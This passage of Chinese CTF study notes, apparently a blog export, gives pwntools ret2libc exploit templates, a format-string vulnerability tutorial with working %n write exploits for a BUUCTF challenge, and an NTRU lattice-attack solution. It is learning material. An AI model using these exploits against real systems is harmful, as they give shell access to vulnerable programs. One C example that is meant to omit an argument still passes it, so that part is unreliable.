class="string">b'A'</span>*<span class="number">112</span> + p32(system_addr) + p32(<span class="number">1234</span>) + p32(binsh_addr)</span><br><span class="line">p.sendlineafter(<span class="string">"!?"</span>,payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<h3 id="gnqOP"><font style="color:rgba(0, 0, 0, 0.87);">模板</font></h3>
write_32

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./pwn"</span>)</span><br><span class="line"><span class="comment">#p = remote()</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">"./libc____"</span>)      <span class="comment"># 题目提供的 lic 文件</span></span><br><span class="line">e = ELF(<span class="string">"./pwn"</span>)</span><br><span class="line"></span><br><span class="line">write_plt_addr = e.plt[<span class="string">"write"</span>]</span><br><span class="line">write_got_addr = e.got[<span class="string">"write"</span>]</span><br><span class="line">main_addr = e.symbols[<span class="string">"main"</span>]</span><br><span class="line"></span><br><span class="line">offset = ???</span><br><span class="line">payload = offset*<span class="string">b'a'</span> + p32(write_plt_addr) + p32(main_addr) + p32(<span class="number">1</span>) + p32(write_got_addr) + p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.recvuntil()</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line">write_offset = libc.symbols[<span class="string">"write"</span>]</span><br><span class="line">system_offset = libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">binsh_offset = libc.search(<span class="string">"/bin/sh"</span>).<span class="built_in">next</span>()</span><br><span class="line"></span><br><span class="line">base_addr = write_addr - write_offset</span><br><span class="line">system_addr = base_addr + system_offset</span><br><span class="line">binsh_addr = base_addr + binsh_offset</span><br><span class="line"></span><br><span class="line">payload = offset*<span class="string">b'a'</span> + p32(system_addr) + p32(<span class="number">1</span>) + p32(binsh_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#r.recvuntil()</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<p>puts_32</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./pwn"</span>)</span><br><span class="line"><span class="comment">#p = remote()</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">"./pwn"</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = e.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = e.got[<span class="string">'puts'</span>]</span><br><span class="line">start_addr = e.symbols[<span class="string">'_start'</span>]</span><br><span class="line"></span><br><span class="line">offset = ???</span><br><span class="line">payload1 = offset*<span class="string">b'a'</span> + p32(puts_plt) + p32(start_addr) + p32(puts_got)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.recvuntil()</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="comment">#p.recvline() x ???       （有时候需要接收信息才能打印地址，具体需要接收多少次自己试）</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>,puts_addr)</span><br><span class="line">libcbase = puts_addr - libc.dump(<span class="string">"puts"</span>)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">"system"</span>)</span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line"></span><br><span class="line">payload2 = offset*<span class="string">b'a'</span> + p32(system_addr) + p32(<span class="number">1234</span>) + p32(binsh_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#r.recvuntil()</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="rznxT">总结</h2>
ret2text：NX保护任意，程序内部有可用代码（如后门函数）

<p>ret2shellcode：NX保护关闭（一般是），可执行内存 + Shellcode写入</p>
<p>ret2syscall：NX保护开启，ROP Gadget + 系统调用参数</p>
<p>ret2libc：NX保护开启，Libc泄露 + system + /bin/sh</p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>格式化字符串漏洞</title>
    <url>/2025/03/30/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p>记录</p>
<span id="more"></span>
<p>格式化字符串漏洞指的是printf仅包含格式化字符串，而没有其他参数时，会越界访问到栈中高地址的内容作为参数，可以造成内存数据被泄露或修改。</p>
<h2 id="avPnq">前提</h2>
在C语言中，格式化字符串主要用于printf()、scanf()、sprintf()等函数，用于控制输入/输出的格式。格式化字符串包含普通字符和格式说明符（以%开头的特殊序列）。



<p>printf() 函数的调用格式为:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"&lt;格式化字符串&gt;"</span>, &lt;参量表&gt;);</span><br></pre></td></tr></table></figure>



<p>printf的第1个参数是字符串，被称为<strong>格式化字符串</strong>。程序员可以在该字符串中使用%d、%s、%c等占位符，printf将依据这些占位符和其他参数整合出一个完整的字符串并输出。</p>
<p>如：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The value of a is %d\n"</span>, a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<p>输出结果为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">The value of a is 10</span><br></pre></td></tr></table></figure>



<p>那如果修改一下，去掉第2个参数，即去掉参量表</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The value of a is %d\n"</span>, a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<p>结果为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">The value of a is 10228640</span><br></pre></td></tr></table></figure>



<p>为什么输出 10228640？</p>
<p>printf 通过格式化字符串中的 %d、%s 等占位符，<strong>从栈上读取参数</strong>。</p>
<p>当调用 printf(“…%d…”) 但未传递对应的变量时，printf 仍然会尝试从栈上读取一个值，并把它当作整数解释。</p>
<h2 id="VPRDL">漏洞原理</h2>
先看第一段代码中的 printf 是如何实现访问实参的

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">|-------------------|</span><br><span class="line">| arg2 (10)         | ← 如果传入 `a`，这里应该是 `a` 的值（10）</span><br><span class="line">|-------------------|</span><br><span class="line">| arg1 (格式化字符串地址) | ← 指向 "The value of a is %d\n"</span><br><span class="line">|-------------------|</span><br><span class="line">| 返回地址           |</span><br><span class="line">|-------------------|</span><br><span class="line">| 调用者的 ebp       |</span><br><span class="line">|-------------------|</span><br><span class="line">| 局部变量等...      |</span><br><span class="line">|-------------------|</span><br><span class="line">| esp               |</span><br><span class="line">|-------------------|</span><br></pre></td></tr></table></figure>

<p>printf的默认首地址是栈上 第一个参数（arg1），即格式化字符串的地址。</p>
<p><font style="color:rgb(25, 27, 31);">再来看第二段代码</font></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">|-------------------|</span><br><span class="line">| same data         | </span><br><span class="line">|-------------------|</span><br><span class="line">| arg1 (格式化字符串地址) | ← 指向 "The value of a is %d\n"</span><br><span class="line">|-------------------|</span><br><span class="line">| 返回地址           |</span><br><span class="line">|-------------------|</span><br><span class="line">| 调用者的 ebp       |</span><br><span class="line">|-------------------|</span><br><span class="line">| 局部变量等...      |</span><br><span class="line">|-------------------|</span><br><span class="line">| esp               |</span><br><span class="line">|-------------------|</span><br></pre></td></tr></table></figure>

<p>此时父函数只把第1个参数压入了栈中，参数上方是其他的数据，但是 printf 并不知情，把栈上的其他数据认成了第2个参数，并且输出了出来。</p>
<h2 id="gHRtB">漏洞利用</h2>
<h3 id="lvsKF">获取栈上数据</h3>
printf 的参数是通过栈传递的（32位系统），或部分通过寄存器传递（64位系统）。

<p>格式化字符串中的每一个 %d、%x、%s 都会依次从栈上读取数据：</p>
<ul>
<li>%1$d 读取第1个参数</li>
<li>%2$d 读取第2个参数</li>
<li>…</li>
<li>%100$d 读取第100个参数</li>
</ul>
<h3 id="37284b1b"><font style="color:rgb(25, 27, 31);">获取任意地址的数据</font></h3>
我们先来看printf("%s", str)是如何工作的

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">|-------------------| 高地址</span><br><span class="line">| str (字符串地址)   | ← 第2个参数（`str` 的指针）</span><br><span class="line">|-------------------|</span><br><span class="line">| "%s" (格式化字符串地址) | ← 第1个参数</span><br><span class="line">|-------------------|</span><br><span class="line">| 返回地址           | ← `call printf` 时压入</span><br><span class="line">|-------------------|</span><br><span class="line">| 调用者的ebp        | ← `push ebp` 保存</span><br><span class="line">|-------------------|</span><br><span class="line">| 局部变量等...      | ← 当前函数的栈帧</span><br><span class="line">|-------------------| 低地址 (esp)</span><br></pre></td></tr></table></figure>

<p>printf(“%s”, str) 会尝试将 str 当作字符串指针，并打印该地址指向的内存，直到遇到 \0。</p>
<p>要想获取任意地址的数据，我们需要先在栈上写入目标地址（有许多方法可以达到这一目的，需要根据题目的条件决定），随后将其作为%s的参数传入。这时，我们就能获取目标地址的数据。</p>
<h3 id="8d4b2282"><font style="color:rgb(25, 27, 31);">向目标地址写入数据</font></h3>
printf 的 %n 格式化符可用于向指定地址写入数据。

<p>如：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"0123456789%n\n"</span>, &amp;a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The value of a is %d"</span>, a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>



<p>结果为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0123456789</span><br><span class="line">The value of a is 10</span><br></pre></td></tr></table></figure>



<p>可以看到，a的值被修改为了10。这是因为printf(“0123456789%n\n”, &amp;a)中%n前已经成功输出了”0123456789”共计10个字节，因此%n便会将10写入目标地址中。</p>
<p>可以看到，%n会将其对应的参数作为地址解析。因此只要我们向栈上写入目标地址，再使用%n即可向目标地址写入数据。</p>
<p><font style="color:rgb(25, 27, 31);">值得注意的是，若将上述代码改为：</font></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">    <span class="type">char</span> b = <span class="string">'b'</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%20c%n"</span>, b, &amp;a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The value of a is %d"</span>, a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<p><font style="color:rgb(25, 27, 31);">这时a的值将变为20。这是因为%20c在字符b的左侧填充了19个空格，再加上b本身是一个字节，共计20个字节。</font></p>
<p><font style="color:rgb(25, 27, 31);">也就是说，当我们需要写入的数据（假定为k + 1）特别大时，可以使用%kc%n代替。</font></p>
<p>而下面的代码缺少第2个参数，则会将 10 写入栈中”0123456789%n\n”上面一格内容x对应的内存M[x]</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"0123456789%n\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<h2 id="FwXIs">例题</h2>
buuctf-[第五空间2019 决赛]PWN5



<p>检查程序安全保护</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:       i386-32-little</span><br><span class="line">RELRO:      Partial RELRO</span><br><span class="line">Stack:      Canary found</span><br><span class="line">NX:         NX enabled</span><br><span class="line">PIE:        No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<p>32位小端序，开启了canary保护，说明无法栈溢出。</p>
<p>IDA打开</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">    <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">    <span class="type">int</span> fd; <span class="comment">// [esp+0h] [ebp-84h]</span></span><br><span class="line">    <span class="type">char</span> nptr[<span class="number">16</span>]; <span class="comment">// [esp+4h] [ebp-80h] BYREF</span></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">100</span>]; <span class="comment">// [esp+14h] [ebp-70h] BYREF</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [esp+78h] [ebp-Ch]</span></span><br><span class="line">    <span class="type">int</span> *v7; <span class="comment">// [esp+7Ch] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">    v7 = &amp;a1;</span><br><span class="line">    v6 = __readgsdword(<span class="number">0x14u</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    v1 = time(<span class="number">0</span>);</span><br><span class="line">    srand(v1);</span><br><span class="line">    fd = open(<span class="string">"/dev/urandom"</span>, <span class="number">0</span>);</span><br><span class="line">    read(fd, &amp;dword_804C044, <span class="number">4u</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"your name:"</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x63u</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Hello,"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"your passwd:"</span>);</span><br><span class="line">    read(<span class="number">0</span>, nptr, <span class="number">0xFu</span>);</span><br><span class="line">    <span class="keyword">if</span> ( atoi(nptr) == dword_804C044 )</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"ok!!"</span>);</span><br><span class="line">        system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"fail"</span>);</span><br><span class="line">    }</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( __readgsdword(<span class="number">0x14u</span>) != v6 )</span><br><span class="line">        sub_80493D0();</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<p>发现格式化字符串漏洞 printf(buf)</p>
<p>该题逻辑是将 dword_804C044 中值与第二次输入的 passwd 进行校对，如果相等则执行 system(“/bin/sh”)，然而 dword_804C044 的值是随机的，所以我们可以通过修改 dword_804C044 的值，然后再次输入此值即可获取shell。</p>
<p>dword_804C044 地址：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.bss:0804C044 ?? ?? ?? ??                   dword_804C044 dd ?                      ; DATA XREF: main+77↑o</span><br></pre></td></tr></table></figure>



<p>计算偏移：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb-peda$ r</span><br><span class="line">Starting program: /home/kali/Desktop/pwn </span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".</span><br><span class="line">your name:aaaa.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p</span><br><span class="line">Hello,aaaa.0xffffce98.0x63.(nil).(nil).0x3.0x80482ac.0xffffceec.0xf7ffdb8c.0x1.0x61616161.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e</span><br><span class="line">your passwd:</span><br></pre></td></tr></table></figure>

<p>0x61是 a 的值，0x61616161在第十个位置，所以偏移量为10</p>
<p>EXP1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#p=remote('node5.buuoj.cn',xxxxx)</span><br><span class="line">p = process('./pwn')</span><br><span class="line"></span><br><span class="line">offset = 10</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(offset,{0x804C044:1}) # 通过 fmtstr_payload 将 dword_804C044 的内容替换为1，而非随机数    </span><br><span class="line"></span><br><span class="line">p.recvuntil('name:')</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil('passwd:')</span><br><span class="line">p.sendline(str(1)) # 随后输入同样的值 1 即可通过if判断，获取shell。</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"># flag{4ad36cb5-e82b-4b83-935f-0fdb38b58788}</span><br></pre></td></tr></table></figure>

<p>fmtstr_payload是pwntools里面的一个工具，用来简化对格式化字符串漏洞的构造工作。  可以实现修改任意内存 fmtstr_payload(offset, {printf_got: system_addr})(偏移，{原地址：目的地址})</p>
<p>EXP2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p=remote('node5.buuoj.cn',xxxxx)</span><br><span class="line">#p = process('./pwn')</span><br><span class="line"></span><br><span class="line">offset = 10</span><br><span class="line"></span><br><span class="line">payload = p32(0x0804c044)+b'%10$n'    # 向 0x804C044 写入 4</span><br><span class="line"></span><br><span class="line">p.recvuntil('name:')</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil('passwd:')</span><br><span class="line">p.sendline(str(4)) </span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>解释一下 payload = p32(0x0804c044)+b’%10$n’ </p>
<ul>
<li>p32(0x804C044)：作用是将目标地址 0x804C044 转换为 4字节小端序 的二进制格式。</li>
<li>%10$n 会从栈上第10个参数的位置读取 0x804C044，并向该地址写入值。</li>
<li>%n 只统计 % 之前输出的字符数（即 p32(0x804C044) 的4字节）。</li>
</ul>
<p>若需写入其他值（如 100），需控制输出字符数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p=remote('node5.buuoj.cn',xxxxx)</span></span><br><span class="line">p = process(<span class="string">'./pwn'</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">10</span></span><br><span class="line"></span><br><span class="line">payload = p32(<span class="number">0x804C044</span>) + <span class="string">b'%96x%10$n'</span>  <span class="comment"># 4 + 96 = 100</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'name:'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">'passwd:'</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">100</span>)) </span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="bacvK">参考</h2>

<p><a href="https://zhuanlan.zhihu.com/p/465896542">https://zhuanlan.zhihu.com/p/465896542</a></p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>格式化字符串漏洞</title>
    <url>/2025/03/31/%E6%A0%BC%E5%AF%86%E7%A0%81/</url>
    <content><![CDATA[<p>记录</p>
<span id="more"></span>
<h1 id="L6a3E">格密码介绍</h1>
<h2 id="OjE7X">格的定义</h2>

<p><img src="https://cdn.nlark.com/yuque/0/2024/png/47928994/1731635922176-15682462-0e84-4a25-9f7c-a329a143ab70.png"></p>
<p>一个格可以看作是由一组线性无关的整数向量通过**<u><font style="color:#DF2A3F;">整数</font></u>**线性组合生成的点的集合。比如，在二维平面中，由两个不共线的向量生成的所有整数组合点构成一个格。</p>
<p>用二维平面上的格辅助理解：</p>
<p><a href="https://www.bilibili.com/video/BV1Qm421J7KL/?spm_id_from=333.1387.favlist.content.click&vd_source=802632f153a1ecb77319c61fa70dccdf">24春第一次例会-Crypto-格密码入门</a></p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/47928994/1741938672051-f0430b9c-03d4-47d0-9c49-59c818794d33.png"></p>
<p>一个格可以看作是由一组线性无关的整数向量通过**<u><font style="color:#DF2A3F;">整数</font></u>**线性组合生成的点的集合。</p>
<p>在这张图片中，B 是基底（格基），由两个基向量组成（包括 i 向量(1,0)，j 向量（0,1) ），格就是图片中的一个个白点，如 ( 1, 1)，( 2, 1) ……</p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/47928994/1741939001293-a9245c59-5f24-41dc-8ecb-a77797d2af09.png"></p>
<p>一个格可以看作是由一组线性无关的整数向量通过**<u><font style="color:#DF2A3F;">整数</font></u>**线性组合生成的点的集合。</p>
<p>在这张图片中，B 是基底（格基），由两个基向量组成（包括 i 向量(2,-1)，j 向量（1,3) ），格就是图片中的一个个白点，如 ( 3, 2)，( 4, 5) ……</p>
<h1 id="ZtweT">格的用途</h1>
<h2 id="GZ5Io">1、NTRU密码</h2>
参数：

<p>模：p</p>
<p>私钥：（f，g）</p>
<p>公钥：h = f⁻¹ g  mod p</p>
<p>临时密钥：r</p>
<p>加密：</p>
<pre><code>                                      c ≡ rh + m ≡ r f⁻¹ g + m (mod p)
</code></pre>
<p>解密：</p>
<pre><code>                                          fc ≡ rg + fm ≡ fm (mod g)
</code></pre>
<p>再乘上 f⁻¹ 即可得到 m 。</p>
<p>参数大小：</p>
<p>显然 rg + fm &lt; p , m &lt; g 时才能正确解密。</p>
<p>考虑格：</p>
<pre><code>                                             $ L = \begin{bmatrix}
</code></pre>
<p>1 &amp; h \<br>0 &amp; p<br>\end{bmatrix} $</p>
<p>同时我们有 hf + kp = g ,</p>
<p>此时我们发现（f，g）便是格中的一个个点。因为</p>
<pre><code>                                       （f，k）L = ( f , fh + pk) = (f , g)
</code></pre>
<p>则，如果我们能找到（f，k）就可以找到（f，g）</p>
<p>更多条件：</p>
<pre><code>                                $ f &lt; \frac{1}{2}p^{1/2}, g &lt; \frac{1}{2}p^{1/2}, m &lt; \frac{1}{4}p^{1/2}, r &lt; \frac{1}{2}p^{1/2} $ 
</code></pre>
<p>此时发现向量 **b **= (f , g) 的长度为</p>
<pre><code>                                  $ \|\mathbf{b}\| = \sqrt{f^2 + g^2} &lt; \sqrt{p/2} $
</code></pre>
<p><font style="color:rgb(0, 0, 0);">如果我们说这个向量会是格中的最短向量呢？（后续会解答）</font></p>
<p>例题</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line"></span><br><span class="line">p = getPrime(1024)</span><br><span class="line"></span><br><span class="line">f = getPrime(400)</span><br><span class="line">g = getPrime(512)</span><br><span class="line">r = getPrime(400)</span><br><span class="line"></span><br><span class="line">h = inverse(f, p) * g % p</span><br><span class="line"></span><br><span class="line">m = b'******'</span><br><span class="line">m = bytes_to_long(m)</span><br><span class="line"></span><br><span class="line">c = (r*h + m) % p</span><br><span class="line"></span><br><span class="line">print(f'p = {p}')</span><br><span class="line">print(f'h = {h}')</span><br><span class="line">print(f'c = {c}')</span><br><span class="line"></span><br><span class="line">'''</span><br><span class="line">p = 170990541130074930801165526479429022133700799973347532191727614846803741888876816210632483231997413973919037199883422312436314365293577997262903161076615619596783971730864586404602951191341733308807254112018161897113881363794353050758324742415299277578203838160939521046655099610387485947145087271531951477031</span><br><span class="line">h = 19027613518333504891337723135627869008620752060390603647368919831595397216728378486716291001290575802095059192000315493444659485043387076261350378464749849058547797538347059869865169867814094180939070464336693973680444770599657132264558273692580535803622882040948521678860110391309880528478220088107038861065</span><br><span class="line">c = 75639016590286995205676932417759002029770539425113355588948888258962338419567264292295302442895077764630601149285564849867773180066274580635377957966186472159256462169691456995594496690536094824570820527164224000505303071962872595619159691416247971024761571538057932032549611221598273371855762399417419551483</span><br><span class="line">'''</span><br></pre></td></tr></table></figure>



<p>题解</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line"></span><br><span class="line">p = 170990541130074930801165526479429022133700799973347532191727614846803741888876816210632483231997413973919037199883422312436314365293577997262903161076615619596783971730864586404602951191341733308807254112018161897113881363794353050758324742415299277578203838160939521046655099610387485947145087271531951477031</span><br><span class="line">h = 19027613518333504891337723135627869008620752060390603647368919831595397216728378486716291001290575802095059192000315493444659485043387076261350378464749849058547797538347059869865169867814094180939070464336693973680444770599657132264558273692580535803622882040948521678860110391309880528478220088107038861065</span><br><span class="line">c = 75639016590286995205676932417759002029770539425113355588948888258962338419567264292295302442895077764630601149285564849867773180066274580635377957966186472159256462169691456995594496690536094824570820527164224000505303071962872595619159691416247971024761571538057932032549611221598273371855762399417419551483</span><br><span class="line"></span><br><span class="line">L = Matrix(ZZ, [[1, h],</span><br><span class="line">                [0, p]])</span><br><span class="line"></span><br><span class="line">f, g = L.LLL()[0]    # 一般都是第一行，不行的话可以遍历每一行</span><br><span class="line"></span><br><span class="line">m = (f*c) % p % g * inverse_mod(f, g) % g</span><br><span class="line"></span><br><span class="line">print(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line">'''</span><br><span class="line">遍历每一行</span><br><span class="line">for row in L.LLL():</span><br><span class="line">    f, g = row</span><br><span class="line">    m = (f*c) % p % g * inverse_mod(f, g) % g</span><br><span class="line">    result = long_to_bytes(m)</span><br><span class="line">    if b'{' in result:</span><br><span class="line">        print(result)</span><br><span class="line">        break</span><br><span class="line">'''</span><br><span class="line"></span><br><span class="line"># NSSCTF{94068324-38bb-410b-b464-e1b8baf6b358}</span><br></pre></td></tr></table></figure>







<p>然而在实际应用中，会发现构造出来的格基很多都不会符合条件，其实还需要结合一个配平的技巧。</p>
<p>例题</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from secret import flag</span><br><span class="line">import libnum</span><br><span class="line"></span><br><span class="line">bits = 2048</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    p = random_prime(2^bits, lbound=2^(bits - 1))</span><br><span class="line">    f = random_prime(2^(3*bits//4 - 1))</span><br><span class="line">    g = random_prime(2^(bits//4 - 1))</span><br><span class="line"></span><br><span class="line">    if gcd(f, p*g) == 1:</span><br><span class="line">        h = f.inverse_mod(p) * g % p</span><br><span class="line">        break</span><br><span class="line"></span><br><span class="line">r = random_prime(2^(3*bits//4 - 1))</span><br><span class="line"></span><br><span class="line">m = libnum.s2n(flag)</span><br><span class="line"></span><br><span class="line">assert m &lt; 2^(bits//4)</span><br><span class="line"></span><br><span class="line">c = (r * h + m) % p</span><br><span class="line"></span><br><span class="line">print('p = %d' % p)</span><br><span class="line">print('h = %d' % h)</span><br><span class="line">print('c = %d' % c)</span><br><span class="line"></span><br><span class="line">'''</span><br><span class="line">p = 